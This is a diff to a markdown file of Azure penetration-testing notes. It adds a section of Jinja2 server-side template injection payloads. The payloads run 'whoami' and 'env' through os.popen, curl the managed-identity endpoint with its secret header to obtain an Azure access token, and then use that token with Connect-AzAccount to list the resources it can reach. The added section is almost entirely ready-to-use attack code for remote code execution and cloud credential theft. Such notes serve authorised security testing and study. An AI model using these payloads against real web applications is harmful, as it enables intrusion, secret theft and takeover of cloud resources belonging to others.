@@ -423,4 +423,24 @@ Let's see what actions are allowed using the below code:
 $URI = 'https://management.azure.com/subscriptions/b413826f-108d-4049-8c11-d52d5d388768/resourceGroups/Engineering/providers/Microsoft.Compute/virtualMachines/bkpadconnect/providers/Microsoft.Authorization/permissions?api-version=2015-07-01'
 ```
 
+#### WebApp Pentesting in Azure
+
+```
+{{config.items()}}
+{{config.__class__.__init__.__globals__['os'].popen('whoami').read()}}
+{{config.__class__.__init__.__globals__['os'].popen('env').read()}}
+```
+
+Now Let's request the access token for the managed identity now using the following code:
+```
+{{config.__class__.__init__.__globals__['os'].popen('curl "$IDENTITY_ENDPOINT?resource=https://management.azure.com&api-version=2017-09-01" -H secret:$IDENTITY_HEADER').read()}}
+```
+
+Use this token with Az PowerShell to find all accessible resources: 
+```
+$token = 'eyJ0e..'
+Connect-AzAccount -AccessToken $token -AccountId 2e91a4fe-a0f2-46ee-8214-fa2ff6aa9abc
+Get-AzResource
+```
+
 
